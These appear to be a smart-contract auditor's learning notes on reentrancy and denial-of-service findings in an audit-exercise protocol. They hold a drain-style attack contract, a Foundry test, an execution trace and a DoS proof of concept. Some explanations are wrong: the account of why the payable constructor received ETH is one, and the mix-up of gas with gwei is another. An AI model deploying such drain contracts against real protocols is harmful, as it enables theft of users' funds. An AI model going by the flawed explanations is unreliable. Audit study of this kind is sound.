## ATTACK VECTORS AND LEARNING

# 1 TRANSFER FUNCTION VS LOW LEVEL CALL FUNCTION

If you go into the related report for the ChristmasDinner protocol, you will see where i reported that reentrancy into the contract was possible via the refund function of the contract due to the modifier not setting the locked variable to true. When attempting to prove this, i tried to use my normal reentrancy strategy by defining what i wanted to do in the receive function of my attack contract. See attack contract code below:

<details>
<summary> Attack Contract </summary>

```javascript
 //SDPX-license-Identifier: MIT

pragma solidity 0.8.27;

import {ChristmasDinner} from "./ChristmasDinner.sol";
import {IERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import {Test, console} from "forge-std/Test.sol";

contract AttackContract is Test {
    address payable public target;
    uint256 public constant TARGETVALUE = 2 ether;
    address[] public wlist;

    event FallbackTriggered(uint256 balance, uint256 entrancefee);

    constructor(
        address payable _target,
        address _WBTC,
        address _WETH,
        address _USDC
    ) {
        target = _target;
        wlist.push(_WBTC);
        wlist.push(_WETH);
        wlist.push(_USDC);
    }

    function deposit() public {
        for (uint i = 0; i < wlist.length; i++) {
            IERC20(wlist[i]).approve(target, TARGETVALUE);
            ChristmasDinner(target).deposit(wlist[i], TARGETVALUE);
        }
    }

    receive() external payable {
        uint256 initialGas = gasleft();
        console.log(initialGas);
        uint256 gasForRefund = (initialGas * 80) / 100; // Reserve some gas for other operations

        // If there's enough gas, proceed with calling the refund function
        require(gasForRefund > 0, "Not enough gas to execute refund");
        if (
            target.balance >= TARGETVALUE ||
            IERC20(wlist[0]).balanceOf(target) >= TARGETVALUE ||
            IERC20(wlist[1]).balanceOf(target) >= TARGETVALUE ||
            IERC20(wlist[2]).balanceOf(target) >= TARGETVALUE
        ) {
            // Call the refund function with sufficient gas
            (bool success, ) = target.call{gas: gasForRefund}(
                abi.encodeWithSignature("refund()")
            );
            require(success, "Refund failed");
        }
    }

    fallback() external payable {
        deposit();
        target.call{value: 1 ether}("");
    }
}

```

</details>

This was the test I attempted to use to test this:

<details>
<summary>Test to prove reentrancy (see test script) </summary>

```javascript
 function test_attacktime() public {
        vm.deal(user1, 10e18);
        vm.deal(user2, 10e18);
        vm.deal(user3, 10e18);
        vm.startPrank(user1);
        cd.deposit(address(wbtc), 1e18);
        cd.deposit(address(weth), 1e18);
        cd.deposit(address(usdc), 1e18);
        address(cd).call{value: 1 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        cd.deposit(address(wbtc), 1e18);
        cd.deposit(address(weth), 1e18);
        cd.deposit(address(usdc), 1e18);
        address(cd).call{value: 1 ether}("");
        vm.stopPrank();
        vm.startPrank(user3);
        cd.deposit(address(wbtc), 1e18);
        cd.deposit(address(weth), 1e18);
        cd.deposit(address(usdc), 1e18);
        address(cd).call{value: 1 ether}("");
        vm.stopPrank();
        address attackaddy = vm.addr(1);
        vm.deal(attackaddy, 100e18);
        vm.startPrank(attackaddy);
        address(ac).call{value: 2 ether}(abi.encodeWithSignature("random()"));
        (bool success, bytes memory returndata) = address(ac).call{
            value: 2 ether
        }("");
        console.log(address(ac).balance);

        vm.stopPrank();
        assertEq(address(ac).balance, 9 ether);
        assertEq(wbtc.balanceOf(address(ac)), 4e18);
        assertEq(weth.balanceOf(address(ac)), 4e18);
        assertEq(usdc.balanceOf(address(ac)), 4e18);
        assertEq(address(ac).balance, 9 ether);
    }

```

</details>

None of this went to plan for a number of reasons I will explain and in this explanation, you will understand the difference between the transfer function and the low level call function. I ran into 2 major problems when running these tests. I will start with the one more relevant to the learning point which is the fact that the test always eneded up with the following error in foundry:

<details>
<summary>Test to prove reentrancy (see test script) </summary>

├─ [28842] AttackContract::receive{value: 2000000000000000000}()
│ ├─ [0] console::log(1056066064 [1.056e9]) [staticcall]
│ │ └─ ← [Stop]
│ ├─ [24782] ChristmasDinner::refund()
│ │ ├─ [3303] ERC20Mock::transfer(AttackContract: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 2000000000000000000 [2e18])
│ │ │ ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: AttackContract: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], value: 2000000000000000000 [2e18])
│ │ │ └─ ← [Return] true
│ │ ├─ [3303] ERC20Mock::transfer(AttackContract: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 2000000000000000000 [2e18])
│ │ │ ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: AttackContract: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], value: 2000000000000000000 [2e18])
│ │ │ └─ ← [Return] true
│ │ ├─ [3303] ERC20Mock::transfer(AttackContract: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 2000000000000000000 [2e18])
│ │ │ ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: AttackContract: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], value: 2000000000000000000 [2e18])
│ │ │ └─ ← [Return] true
│ │ ├─ [2300] AttackContract::receive{value: 1000000000000000000}()
│ │ │ ├─ [0] console::log(2241) [staticcall]
│ │ │ │ └─ ← [Stop]
│ │ │ ├─ [910] ChristmasDinner::refund()
│ │ │ │ └─ ← [OutOfGas] EvmError: OutOfGas
│ │ │ └─ ← [OutOfGas] EvmError: OutOfGas
│ │ └─ ← [Revert] EvmError: Revert

</details>

What you can see is that the test is showing an out of gas error which made no sense to me so i decided to do random things that adjust block gas limit, etc and it didnt work. So i saw that the gas issue was occuring immediately my attack contract received the first refund from the christmas dinner contract and then the logic from my receive function was to run which was a function that would call refund again obviously to try and drain the contract. So i decided to check how much gas was being used in each receive function call. there is a solidity global function called gasleft() that returns how much gas is left when a function is running so if you look in the receive function, i used this to log how much gas each receive call was using to know why the out of gas error was showing up.

As you can see from the error above, in the first receive function, the gas allocated is about 1 million gwei which is actually way too much and you wont see this a lot as that is a lot of money just for one function. However, once the first refund happens and my attack contract receives it and wants to call refund again, the gasleft is now 2241 which had me dumbfounded becausw how can 1 million gas just change to 2241. After some debugging, i looked in the refund function that my receive function and I saw that when the contract was refunding eth to my attack contract, this was the function that was running:

```javascript
function _refundETH(address payable _to) internal {
        uint256 refundValue = etherBalance[_to];
        //_to.call{value: refundValue}("");
        _to.transfer(refundValue);
        etherBalance[_to] = 0;
    }
```

The key was in that transfer function. I noticed that when i changed the transfer function to a low level call function that just transfers eth to my attack contract, i am able to drain all the eth from the contract. so I knew that even though the transfer function and the low level call do the same thing, there are slight nuances that i didnt know about in terms of gas usage with that transfer function. In my research, this is what i found:

In Solidity, security concerns around sending Ether to contracts are a major reason why transfer() is often considered safer than call{value:}. The specific security feature that makes transfer() safer is its gas limitation.

When you use transfer(), the receiving contract (if it's a contract) can only receive a fixed 2300 gas. This small amount of gas is enough to log an event and execute basic logic like emitting a Transfer event, but it is intentionally limited.
This limitation is key because it prevents the receiving contract from performing complex operations, like making additional calls to other contracts or sending Ether to other addresses.

Because transfer() only forwards 2300 gas to the receiving contract, it severely limits the possibilities for a contract to call back into the sender or perform any complex logic.This small gas stipend is intentionally restrictive, ensuring that the contract can't re-enter the sender contract and thus mitigating the risk of reentrancy attacks. On the other hand, call{value:} forwards all remaining gas (by default), which means that the receiving contract can perform more complex operations, including calling back into the sender contract. This makes call{value:} more flexible but also more dangerous, as it doesn't have the same gas restrictions. If the receiving contract has a malicious function or is poorly designed, it could potentially exploit this flexibility to trigger reentrancy attacks or other vulnerabilities in the sender contract.

When the transfer function in Solidity is used to send Ether to an address, the gas handling works as follows:
The transfer function in Solidity sends a fixed amount of gas (2300 gas) to the recipient's fallback or receive function. This is done for safety reasons to limit the execution of complex logic in the recipient's contract, preventing potential reentrancy attacks or excessive gas usage.

The transfer function sends exactly 2300 gas to the recipient's address. This fixed gas stipend is part of the transfer mechanism and cannot be adjusted.
The recipient of the Ether (the to address in \_to.transfer(value)) gets the gas. If the recipient is an EOA (Externally Owned Account), the gas is effectively unused, as EOAs do not execute any logic. If the recipient is a smart contract, the gas is made available for executing the contract's receive or fallback function (if defined).

There have been some suggestions and potential EIP's to increase the gas limit on the transfer function have been discussed. See discussions in links below:

https://github.com/ethereum/EIPs/issues/1285
https://ethereum.stackexchange.com/questions/59197/transfer-function-gas-limit-why-2-300

So this perfectly explains why the transfer function was used. Now whoever wrote this thought they were smart. This led to my second problem when trying to drain my contract like i did above. when refunding erc20's once the erc20 is refunded, the balance is set to 0 and this function is internal which means i cannot directly call it. it is called in the refund function but when i call refund, it calls refund erc20 which does the following:

```javascript
 function _refundERC20(address _to) internal {
        //a could have _to as a payable address to allow consistency with refund function and avoid conversion
        i_WETH.safeTransfer(_to, balances[_to][address(i_WETH)]); //q why not loop through whitelisted tokens and transfer all of them?
        i_WBTC.safeTransfer(_to, balances[_to][address(i_WBTC)]);
        i_USDC.safeTransfer(_to, balances[_to][address(i_USDC)]);
        balances[_to][address(i_USDC)] = 0;
        balances[_to][address(i_WBTC)] = 0;
        balances[_to][address(i_WETH)] = 0;
    }

```

So i cannot reenter the refund function because by the time i call refund again, all my balances are set to 0 as the \_refunderc20 function would have finished running before i can call refund again and i saw this was the case when i temporarily changes the transfer function to low level call during debugging to see the outcome. what they dont know is that i can simply set up an event listener as each safetransfer function in this \_refunderc20 emits an event so i can set up a listener to listen for the Transfer event and once it happens, i know that one of these transfers is done and i can recall refund function which will reenter this \_refunderc20 function before the balances get reset and i can keep doing this until i drain all balances of all erc20's in the contract. I used ethers and hardhat to do it. you can see the test in the report and also in the hardhatlistenerv2 folder in the eventslistener.js file.

Another thing I couldve done which I didnt know at the time was that I could've entered an ERC777 contract as one of the acceptable tokens in the ChristmasDinner contract and then used the token to reenter the \_refunderc20 function via the safetransfer function that is called in that function. I didnt know about ERC777 at the time and i didnt know about weird erc20's at the time but after doing the tswap audit, i implemented an ERC777 token to exploit the protocol and if you look at the notes.md in the 5-tswapaudit, i explained all of it there and you can read all of that to get a complete understanding of how these things work. I explained it in detail there so make sure to check that out.

# 2 PAYABLE FUNCTIONS ALLOW RECEIVING ETHER

When writing the POC for my L-1 finding about DOS attack being possible (see report). The first contract I wrote that could send ether but not receive ether was as follows:

```javascript

//SDPX-License-Identifier: MIT

pragma solidity 0.8.27;

import {ChristmasDinner} from "./ChristmasDinner.sol";

contract EmptyContract {
address payable public target;

    constructor(address _target) payable {
        target = payable(_target);
        target.call{value: 1 ether}("");
        ChristmasDinner(target).refund();
    }

}
```

the idea was thatif a user tried to call refund with a smart contract that had no receive function, it would revert and cause a DOS. With this contract, the problem was that i set the constructor to payable and that payable keyword not only means the function can send ether but it means it can receive ether as well. so when this contract is deployed, it calls the refund function which allows it to receive ether so on deployment of the contract, i expected a revert that never happened because i called the refund function inside a payable constructor which meant that the christmas dinner contract could send me that either back within this function. I had to refactor this to remove the refund function from the payable constructor and call it seperately in the test script. Calling it seperately means it is its own function and not in the constructor which means when the christmas dinner attempts to send ether, it will look for a receive or fallback which isnt in my contract and it will revert as expected (see report for correct test).

CALLING REFUND IN CONSTRUCTOR IS PAYABLE SO ALLOWED TO RECEIVE ETH . KEEP THIS IN MIND
